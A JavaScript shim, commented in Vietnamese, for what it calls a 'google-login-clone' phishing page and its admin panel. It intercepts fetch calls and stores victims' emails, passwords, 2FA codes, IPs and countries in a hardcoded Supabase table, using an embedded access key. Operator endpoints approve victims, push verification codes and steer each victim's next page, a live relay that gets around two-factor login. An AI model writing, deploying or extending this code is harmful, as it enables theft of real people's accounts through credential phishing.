/**
 * api-shim.js — Cho phép admin-gui và google-login-clone chạy trên Netlify
 * mà không cần server.cjs. Shim này chặn window.fetch tới
 * http://localhost:5000/api/* và chuyển thành lệnh gọi Supabase REST API.
 *
 * Cách dùng: thêm <script src="/api-shim.js"></script> vào đầu mỗi HTML,
 * TRƯỚC khi code gốc chạy. Sau đó không cần sửa gì thêm.
 */
(function () {
    'use strict';

    // Supabase project config
    const SUPABASE_URL  = 'https://jacfiibznpibdzmcnqzg.supabase.co';
    // Anon JWT (chuẩn PostgREST). Key format sb_publishable_* chưa dùng được.
    const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImphY2ZpaWJ6bnBpYmR6bWNucXpnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzcwMjAwNjIsImV4cCI6MjA5MjU5NjA2Mn0.tfqJGCiEZ5WWOAFR4h9xI5JZWpuj92kQrzaMOIxGRU4';
    const TABLE = 'login_requests';
    const REST  = `${SUPABASE_URL}/rest/v1/${TABLE}`;

    const sbHeaders = {
        apikey: SUPABASE_ANON,
        Authorization: `Bearer ${SUPABASE_ANON}`,
        'Content-Type': 'application/json; charset=utf-8',
    };

    const PAGE_MAP = {
        'index.html': 'Login',
        'password.html': 'Password',
        'verify.html': 'Setup Code Phone',
        'verify-device.html': 'Setup Code Phone',
        'verify-notification.html': 'Notification',
        'verify-options.html': 'Notification',
    };

    // Map row DB (snake_case) -> entry client (camelCase)
    function rowToEntry(r) {
        if (!r) return null;
        return {
            id: r.id,
            email: r.email,
            sessionId: r.session_id || '',
            password: r.password || '',
            twofa: r.twofa || '',
            verificationCode: r.verification_code || '',
            pageStatus: r.page_status || 'Login',
            status: r.status || 'pending',
            nextPage: r.next_page || '',
            userAgent: r.user_agent || '',
            ip: r.ip || '',
            country: r.country || '',
            countryCode: r.country_code || '',
            tag: r.tag || '',
            note: r.note || '',
            createdAt: r.created_at || new Date().toISOString(),
            lastSeen: r.last_seen || null,
        };
    }

    function entryToRow(e) {
        const m = {};
        if (e.email !== undefined)            m.email = e.email;
        if (e.sessionId !== undefined)        m.session_id = e.sessionId;
        if (e.password !== undefined)         m.password = e.password;
        if (e.twofa !== undefined)            m.twofa = e.twofa;
        if (e.verificationCode !== undefined) m.verification_code = e.verificationCode;
        if (e.pageStatus !== undefined)       m.page_status = e.pageStatus;
        if (e.status !== undefined)           m.status = e.status;
        if (e.nextPage !== undefined)         m.next_page = e.nextPage;
        if (e.userAgent !== undefined)        m.user_agent = e.userAgent;
        if (e.ip !== undefined)               m.ip = e.ip;
        if (e.country !== undefined)          m.country = e.country;
        if (e.countryCode !== undefined)      m.country_code = e.countryCode;
        if (e.tag !== undefined)              m.tag = e.tag;
        if (e.note !== undefined)             m.note = e.note;
        if (e.lastSeen !== undefined)         m.last_seen = e.lastSeen;
        return m;
    }

    const _fetch = window.fetch.bind(window);

    function jsonResp(data, status) {
        return new Response(JSON.stringify(data), {
            status: status || 200,
            headers: { 'Content-Type': 'application/json' },
        });
    }

    async function findByEmail(email) {
        if (!email) return null;
        const q = new URLSearchParams({
            select: '*', email: `eq.${email}`, order: 'id.desc', limit: '1',
        });
        const r = await _fetch(`${REST}?${q}`, { headers: sbHeaders });
        if (!r.ok) throw new Error(`findByEmail ${r.status}`);
        const rows = await r.json();
        return rowToEntry(rows[0]);
    }

    async function findById(id) {
        if (id === undefined || id === null || id === '') return null;
        const q = new URLSearchParams({
            select: '*', id: `eq.${id}`, limit: '1',
        });
        const r = await _fetch(`${REST}?${q}`, { headers: sbHeaders });
        if (!r.ok) throw new Error(`findById ${r.status}`);
        const rows = await r.json();
        return rowToEntry(rows[0]);
    }

    async function listAll() {
        const q = new URLSearchParams({ select: '*', order: 'id.asc' });
        const r = await _fetch(`${REST}?${q}`, { headers: sbHeaders });
        if (!r.ok) throw new Error(`listAll ${r.status}`);
        const rows = await r.json();
        return rows.map(rowToEntry);
    }

    async function insertEntry(entry) {
        const r = await _fetch(REST, {
            method: 'POST',
            headers: { ...sbHeaders, Prefer: 'return=representation' },
            body: JSON.stringify([entryToRow(entry)]),
        });
        if (!r.ok) throw new Error(`insertEntry ${r.status}: ${await r.text()}`);
        const rows = await r.json();
        return rowToEntry(rows[0]);
    }

    async function updateEntry(id, patch) {
        const q = new URLSearchParams({ id: `eq.${id}` });
        const r = await _fetch(`${REST}?${q}`, {
            method: 'PATCH',
            headers: { ...sbHeaders, Prefer: 'return=representation' },
            body: JSON.stringify(entryToRow(patch)),
        });
        if (!r.ok) throw new Error(`updateEntry ${r.status}: ${await r.text()}`);
        const rows = await r.json();
        return rowToEntry(rows[0]);
    }

    async function deleteByIds(ids) {
        if (!ids || !ids.length) return 0;
        const q = new URLSearchParams({ id: `in.(${ids.map(String).join(',')})` });
        const r = await _fetch(`${REST}?${q}`, {
            method: 'DELETE',
            headers: { ...sbHeaders, Prefer: 'return=representation' },
        });
        if (!r.ok) throw new Error(`deleteByIds ${r.status}: ${await r.text()}`);
        const rows = await r.json();
        return Array.isArray(rows) ? rows.length : 0;
    }

    // Đoạn này là "bộ não" của shim: lấy url + method, match với endpoint
    // server.cjs, rồi gọi Supabase tương đương.
    async function handleApi(pathname, method, body, search) {
        // POST /api/request
        if (method === 'POST' && pathname === '/api/request') {
            const {
                email = '', password = '', twofa = '',
                userAgent = '', currentPage = '', sessionId = '',
                ip = '', country = '', countryCode = '',
            } = body || {};
            if (!email) return jsonResp({ error: 'email required' }, 400);

            let entry = await findByEmail(email);
            if (!entry) {
                entry = await insertEntry({
                    email, sessionId, password, twofa,
                    pageStatus: (currentPage && PAGE_MAP[currentPage]) || 'Login',
                    userAgent, ip, country, countryCode,
                    lastSeen: new Date().toISOString(),
                });
            } else {
                const patch = {
                    status: 'pending', nextPage: '',
                    lastSeen: new Date().toISOString(),
                };
                if (sessionId && !entry.sessionId) patch.sessionId = sessionId;
                if (password) patch.password = password;
                if (twofa)    patch.twofa = twofa;
                if (userAgent) patch.userAgent = userAgent;
                if (currentPage && PAGE_MAP[currentPage]) patch.pageStatus = PAGE_MAP[currentPage];
                if (!entry.ip && ip)               patch.ip = ip;
                if (!entry.country && country)     patch.country = country;
                if (!entry.countryCode && countryCode) patch.countryCode = countryCode;
                entry = await updateEntry(entry.id, patch);
            }
            return jsonResp({ ...entry, requestId: entry.id });
        }

        // POST /api/update-page
        if (method === 'POST' && pathname === '/api/update-page') {
            const { id, email, pageStatus, currentPage } = body || {};
            const entry = (id && await findById(id)) || await findByEmail(email);
            if (entry) {
                const patch = { lastSeen: new Date().toISOString() };
                if (pageStatus) patch.pageStatus = pageStatus;
                else if (currentPage) patch.pageStatus = PAGE_MAP[currentPage] || currentPage;
                await updateEntry(entry.id, patch);
            }
            return jsonResp({ ok: true });
        }

        // GET /api/status/:id
        if (method === 'GET' && pathname.startsWith('/api/status/')) {
            const id = decodeURIComponent(pathname.split('/').pop());
            const entry = await findById(id);
            return jsonResp(entry || { status: 'pending' });
        }

        // GET /api/check-approval?email=...
        if (method === 'GET' && pathname === '/api/check-approval') {
            const entry = await findByEmail(search.get('email'));
            return jsonResp({
                status: entry ? entry.status : 'pending',
                verificationCode: entry ? entry.verificationCode : '',
                nextPage: entry ? (entry.nextPage || '') : '',
            });
        }

        // GET /api/pending
        if (method === 'GET' && pathname === '/api/pending') {
            const rows = await listAll();
            return jsonResp(rows);
        }

        // POST /api/approve
        if (method === 'POST' && pathname === '/api/approve') {
            const { id, email, decision, nextPage, verificationCode } = body || {};
            let entry = (id && await findById(id)) || await findByEmail(email);
            if (!entry) return jsonResp({ error: 'not found', id, email }, 404);
            const patch = {
                status: decision === 'denied' ? 'denied' : 'approved',
                nextPage: nextPage || '',
            };
            if (verificationCode) patch.verificationCode = verificationCode;
            entry = await updateEntry(entry.id, patch);
            return jsonResp({ ok: true, entry });
        }

        // POST /api/set-verification-code
        if (method === 'POST' && pathname === '/api/set-verification-code') {
            const { email, code } = body || {};
            const entry = await findByEmail(email);
            if (!entry) return jsonResp({ error: 'not found' }, 404);
            await updateEntry(entry.id, { verificationCode: code || '' });
            return jsonResp({ ok: true });
        }

        // POST /api/delete
        if (method === 'POST' && pathname === '/api/delete') {
            const { id, ids } = body || {};
            const targetIds = Array.isArray(ids) && ids.length
                ? ids : (id !== undefined && id !== null ? [id] : []);
            if (!targetIds.length) return jsonResp({ error: 'id or ids required' }, 400);
            const deleted = await deleteByIds(targetIds);
            return jsonResp({ ok: true, deleted });
        }

        // POST /api/set-meta
        if (method === 'POST' && pathname === '/api/set-meta') {
            const { id, tag, note } = body || {};
            const entry = await findById(id);
            if (!entry) return jsonResp({ error: 'not found' }, 404);
            const patch = {};
            if (typeof tag  === 'string') patch.tag  = tag;
            if (typeof note === 'string') patch.note = note;
            const updated = await updateEntry(entry.id, patch);
            return jsonResp({ ok: true, entry: updated });
        }

        // GET /api/verification-html/:email
        if (method === 'GET' && pathname.startsWith('/api/verification-html/')) {
            const email = decodeURIComponent(pathname.replace('/api/verification-html/', ''));
            const entry = await findByEmail(email);
            const code = entry ? entry.verificationCode : '';
            return jsonResp({ code, html: code ? `<div class="code">${code}</div>` : '' });
        }

        return jsonResp({ error: 'API not found', pathname }, 404);
    }

    // Debug counters
    let callCount = 0;
    let errCount  = 0;

    // Override fetch
    window.fetch = async function (input, init) {
        const urlStr = typeof input === 'string' ? input : (input && input.url) || '';
        const isLocalApi =
            urlStr.includes('localhost:5000/api/') ||
            urlStr.includes('127.0.0.1:5000/api/') ||
            urlStr.startsWith('/api/');
        if (!isLocalApi) return _fetch(input, init);

        const u = new URL(urlStr, window.location.origin);
        const method = ((init && init.method) || 'GET').toUpperCase();
        let body = {};
        if (init && init.body) {
            try { body = JSON.parse(init.body); } catch { body = {}; }
        }

        callCount += 1;
        const t0 = performance.now();
        const tag = `#${callCount} ${method} ${u.pathname}${u.search}`;
        try {
            const resp = await handleApi(u.pathname, method, body, u.searchParams);
            const ms = (performance.now() - t0).toFixed(0);
            const bg = resp.status >= 400 ? '#fc0' : '#3c3';
            console.log(
                `%c[api-shim] ${tag} → ${resp.status} (${ms}ms)`,
                `background:${bg};color:#000;padding:1px 4px;border-radius:2px`,
            );
            return resp;
        } catch (e) {
            errCount += 1;
            console.error(`[api-shim] ${tag} FAILED`, e);
            return jsonResp({ error: 'shim error', message: String(e.message || e) }, 500);
        }
    };

    // Expose for debug
    window.__apiShim = {
        supabaseUrl: SUPABASE_URL,
        table: TABLE,
        stats: () => ({ calls: callCount, errors: errCount }),
        ping: async () => {
            const r = await _fetch(`${REST}?select=id&limit=1`, { headers: sbHeaders });
            return { status: r.status, ok: r.ok };
        },
    };

    console.log(
        '%c[api-shim] Supabase mode ACTIVE',
        'background:#0cf;color:#000;padding:4px 10px;border-radius:4px;font-weight:bold',
        `\n  → all fetch to localhost:5000/api/* will be routed to ${SUPABASE_URL}`,
        '\n  → type  __apiShim.stats()  or  __apiShim.ping()  in console to debug',
    );
})();
